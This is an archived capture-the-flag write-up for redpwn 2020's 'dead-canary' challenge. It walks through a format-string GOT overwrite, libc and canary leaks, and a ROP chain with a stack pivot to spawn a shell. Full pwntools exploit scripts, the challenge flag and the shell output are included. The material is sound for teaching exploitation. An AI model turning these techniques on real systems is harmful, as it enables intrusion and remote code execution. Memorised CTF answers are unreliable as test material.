# dead-canary

**CTF:** redpwn 2020  
**Category:** misc  
**Original writeup:** <https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2020/dead-canary/README.md> — by **datajerk**. All credit goes to the original author; this is an archived copy.

---

## pwn/dead-canary

> NotDeGhost

>

> 475

>

> It is a terrible crime to slay a canary. Killing a canary will keep your exploit alive even if you are an inch from segfaults. But at a terrible price.

>

> `nc 2020.redpwnc.tf 31744`

>

> [`dead-canary.tar.gz`](dead-canary.tar.gz)

Tags: _pwn_ _x86-64_ _stack-canary_ _format-string_ _remote-shell_ _rop_ _stack-pivot_ _bof_

## Summary

Leverage a format string exploit to leak libc and change `__stack_chk_fail` to `main` for multiple passes triggered by canary corruption (bof), after that, there are options:

1. ROP chain on stack and pivot [exploit.py](exploit.py) [exploit5.py](exploit5.py) [exploit7.py](exploit7.py)

2. Change `printf` to `system` (no canary leak) [exploit2.py](exploit2.py) [exploit3.py](exploit3.py)

3. Avoid pivot and use `one_gadget` (the bof is tight--8 bytes) [exploit4.py](exploit4.py)

4. Leak stack location and write out ROP chain directly after saved RBP (no canary leak) [exploit6.py](exploit6.py)

I kinda beat this one to death. For the CTF I went with option 1 ([exploit.py](exploit.py))--something I'd not done before. As for the rest, this was a good excuse to work on some automation and a better understanding of pwntools fmtstr support, as well as some better format string handling.

## Analysis

### Checksec

```

Arch: amd64-64-little

RELRO: Partial RELRO

Stack: Canary found

NX: NX enabled

PIE: No PIE (0x400000)

```

No PIE + Partial RELRO = easy GOT updates. Given the challenge title, we'll have to deal with the canary first.



### Decompile with Ghidra

```c

undefined8 FUN_00400737(void)

{

long in_FS_OFFSET;

char local_118 [264];

long local_10;



local_10 = *(long *)(in_FS_OFFSET + 0x28);

setbuf(stdout,(char *)0x0);

setbuf(stdin,(char *)0x0);

setbuf(stderr,(char *)0x0);

printf("What is your name: ");

FUN_004007fc(0,local_118,0x120);

printf("Hello ");

printf(local_118);

if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {

/* WARNING: Subroutine does not return */

__stack_chk_fail();

}

return 0;

}

```

That's it. (`FUN_004007fc` is just a frontend to `read`.)

There's at least three vulnerabilities:

1. `printf(local_118)`--format string is missing.

2. An 8 byte overflow if the canary is known; `local_118` is `0x118` bytes from the return address (see Ghidra stack diagram), and `FUN_004007fc` is reading up to `0x120` bytes. This allows for a single 8 byte payload (gadget or pivot).

3. A format string exploit can overwrite the GOT, the stack, and any other writable region of memory; and read just about anything.

Since there's no loop and no obvious one-shot solution, overwriting `__stack_chk_fail` GOT to jump to `main` (`FUN_00400737`) for infinite passes is the first step, then corrupting the canary (bof) on each pass will score another pass.

## Exploit(s)

### Option 1: ROP chain on stack and pivot

First, we have to find the offsets in the stack for all the leaks and format strings. Normally I'd just run the binary in GDB, set a break point just before the vulnerable `printf` and then examine where my input was on the stack. But lately I've been just writing something like this:

```python

#!/usr/bin/python3

from pwn import *

def scanit(binary,t):

context.log_level='WARN'

p = process(binary.path)

p.recvuntil('name: ')

p.sendline(t)

p.recvuntil('Hello ')

_ = p.recvline().strip()

p.close()

return _

def findoffset(binary):

for i in range(1,20):

t = '%' + str(i).rjust(2,'0') + '$018p'

_ = scanit(binary,t)

print(i,_)

if _.find(b'0x') >= 0:

s = bytes.fromhex(_[2:].decode())[::-1]

if s == t.encode():

return(i)

return None

```

This first half of [offset.py](offset.py) will emit each line of the stack and compare with the input, if there's a match, then the offset is returned.

```python

def findcanary(binary,offset):

for i in range(offset,50):

t = '%' + str(i).rjust(2,'0') + '$018p'

context.log_level='WARN'

p = process(binary.path)

d = process(['gdb',binary.path,'-p',str(p.pid)])

d.sendlineafter('gdb) ','source ~/.gdbinit_gef')

d.sendlineafter('gef➤ ','canary')

d.recvuntil('canary of process ' + str(p.pid) + ' is ')

canary = d.recvline().strip()

d.sendlineafter('gef➤ ','c')

d.close()

p.recvuntil('name: ')

p.sendline(t)

p.recvuntil('Hello ')

_ = p.recvline().strip()

print(i,_,canary)

if _ == canary:

return(i)

return None

binary = ELF('./dead-canary')

offset = findoffset(binary)

canaryoffset = findcanary(binary,offset)

print()

print('offset:',offset)

print('canaryoffset:',canaryoffset)

```

The second half returns the offset of the canary. This is a little tricker since the canary changes on each run and there's no loops (yet). This hack just uses GEF to get the canary, then checks one (incrementing) stack offset until there's a match.

Final output:

```bash

offset: 6

canaryoffset: 39

```

This is all that is needed to write an exploit to update the GOT as well as overflow the buffer with an 8 byte attack, however there's nothing really useful in the binary (no win function), so libc will need to be leaked. This can be done with a format string exploit using `%s` to leak from the GOT (see [Got It](https://github.com/datajerk/ctf-write-ups/blob/master/hsctf7/got_it/README.md) as an example) or we can just pull from the stack. I went with the latter since I wanted to find a stack address as well:

```

06: 0x00007fffffffe410│+0x0000: 0x0000000a68616c62 ("blah

"?) ← $rsp, $rdi

...

39: 0x00007fffffffe518│+0x0108: 0xd47acbfe72babe00

40: 0x00007fffffffe520│+0x0110: 0x0000000000400880 → push r15 ← $rbp

41: 0x00007fffffffe528│+0x0118: 0x00007ffff7a05b97 → <__libc_start_main+231> mov edi, eax

42: 0x00007fffffffe530│+0x0120: 0x0000000000000001

43: 0x00007fffffffe538│+0x0128: 0x00007fffffffe608 → 0x00007fffffffe809 → "/pwd/datajerk/redpwnctf2020/dead-canary/bin/dead-c[...]"

```

Above is the stack after setting a break point just before the vulnerable `printf` and entering `blah` as _your name:_. From the script above we know that the start of the `printf` is at offset 6 (I numbered the stack above), and that the canary is at offset 39. This aligns with the output above. Looking down stack there's a reference to libc at offset 41 and a stack leak at offset 43 (it's very similar to the stack addresses).

Now we have everything we need.

[exploit.py](exploit.py):

```python

#!/usr/bin/python3

from pwn import *

binary = ELF('./dead-canary')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.update(arch='amd64',os='linux')

binary.symbols['main'] = 0x400737

rop = ROP([binary])

ret = rop.find_gadget(['ret'])[0]

pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

add_rsp_8 = rop.find_gadget(['add rsp, 8','ret'])[0]

offset = 6

canaryoffset = 39

libcoffset = 41

#p = process(binary.path)

p = remote('2020.redpwnc.tf', 31744)

```

Above is the initial setup. The offsets were computed or discovered above. Since there's no symbols in the binary, `main` had to be manually assigned (see Ghidra disassembly for `FUN_00400737`). We'll also need a few ROP gadgets for the ROP chain (`pop rdi` and `add rsp, 8` are functionally identical for this exploit, however my first thought was to just add to `rsp`).

```python

# first pass, inf. retries if we blow out canary, leak libc

p.recvuntil('name: ')

payload = b'%' + str(libcoffset).encode().rjust(2,b'0') + b'$018p'

payload += fmtstr_payload(offset+1,{binary.got['__stack_chk_fail']:binary.symbols['main']},numbwritten=18)

payload += ((0x118 - 0x10 + 1) - len(payload)) * b'A'

p.send(payload)

p.recvuntil('Hello ')

_ = p.recv(18)

__libc_start_main = int(_,16) - 231

log.info('__libc_start_main: ' + hex(__libc_start_main))

baselibc = __libc_start_main - libc.symbols['__libc_start_main']

log.info('baselibc: ' + hex(baselibc))

libc.address = baselibc

```

The first pass is the most important and sets the stage for multiple passes. From the top down:

1. The payload starts with exactly 8 bytes that will read the libc leak from offset `41`. We must keep the stack aligned and also keep track of format string offset _offsets_, as well as how many bytes will be emitted. The `$018p` ensures that exactly 18 bytes are emitted. This needs to be passed to the `fmtstr_payload` function so that it can properly compute format string exploit.

2. pwntools out-of-the-box includes fantastic format string exploit support. All of the exploits in this walkthrough leverage this, but in slightly different ways. The first parameter is the `offset`, this is off by one since we already used 8 bytes; we have to inform `fmtstr_payload` of that fact or its math will be off (`len(payload) // 8` would have been more portable). The next parameter is a dictionary of _where_:_what_. In this example, we're replacing the `__stack_chk_fail` GOT entry with the address of `main`. This will cause any call to `__stack_chk_fail` to jump to `main`. The last parameter is the number of bytes emitted by `printf`. This is very important, for format string exploits to work the exact number of previous emitted bytes needs to be accounted for, or the math will fail. The `printf` format string to leak a libc address emits exactly 18 bytes.

3. The rest of the payload just fills up the stack up to and including the first canary byte. `0x118 - 0x10` (see Ghidra stack diagram, char array is at `0x118` and canary is at `0x10`). The extra `A` (`+ 1`) corrupts the least significant byte of the canary. This will cause `__stack_chk_fail` to jump to `main` for our next pass at the end of `main`.

4. The final `printf` called in `main` will emit `18` bytes--the leaked libc address. And since the version of libc was provided (inferred from the use of Ubuntu 18.04 in the Dockerfile), we can simply compute the base of libc.

```python

# 2nd pass, leak canary, setup payload

p.recvuntil('name: ')

payload = b'%' + str(canaryoffset).encode().rjust(2,b'0') + b'$018p'

payload += p64(ret)

payload += p64(pop_rdi)

payload += p64(libc.search(b'/bin/sh').__next__())

payload += p64(libc.symbols['system'])

payload += ((0x118 - 0x10 + 1) - len(payload)) * b'A'

p.send(payload)

p.recvuntil('Hello ')

_ = p.recv(16)

canary = int(_,16) << 8

log.info('canary: ' + hex(canary))

```

The second pass is not unlike the first pass, but this time we leak the canary. But also setup our payload in the stack. Again it is important to keep it all stack aligned. And again we have to overwrite the canary byte to trigger a third pass. The good news is that the canary least significant byte is always `0x00`, so we just need to read `16` bytes from the emitted `18`, and shift left for the `0x00`.

At this point we also have our payload in the stack. When this second pass _jumps_ (not _returns_) back to `main`, `main` will allocate more stack space, leaving this stack space alone, _right on top of this stack space_. You can follow the assembly to see this, or just play around in GDB (I did).

On the third pass the stack will look like this:

```

3rd pass 264 char buffer (<- rsp)

3rd pass canary (same as all canaries)

3rd pass rdb

3rd pass return address

2nd pass 8-byte format string to emit canary (%39$018p)

2nd pass address to ret gadget

2nd pass address to pop rdi gadget

...

```

```python

# final pass pivot

p.recvuntil('name: ')

payload = (0x118 - 0x10) * b'A'

payload += p64(canary)

payload += 8 * b'B'

payload += p64(add_rsp_8)

p.send(payload)

p.interactive()

```

For the final pass we just need to craft a payload with the canary for our bof attack. `(0x118 - 0x10) * b'A'` will fill the buffer with `A`s up to the canary, next send the leaked canary, after that 8 bytes for the save base pointer, then finally 8 bytes to change the stack pointer to our payload. That `add rsp,8` will just jump over the `%39$018p` left over from emitting the canary (a `pop rdi` would have done the same). With the stack pointer now positioned at our payload we get a shell.

Output:

```bash

# ./exploit.py

[*] '/pwd/datajerk/redpwnctf2020/dead-canary/bin/dead-canary'

Arch: amd64-64-little

RELRO: Partial RELRO

Stack: Canary found

NX: NX enabled

PIE: No PIE (0x400000)

[*] '/lib/x86_64-linux-gnu/libc.so.6'

Arch: amd64-64-little

RELRO: Partial RELRO

Stack: Canary found

NX: NX enabled

PIE: PIE enabled

[*] Loaded 14 cached gadgets for './dead-canary'

[+] Opening connection to 2020.redpwnc.tf on port 31744: Done

[*] __libc_start_main: 0x7f679bdf9ab0

[*] baselibc: 0x7f679bdd8000

[*] canary: 0x6a3b6d6c6f4b8500

[*] Switching to interactive mode

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ cat flag.txt

flag{t0_k1ll_a_canary_4e47da34}

```
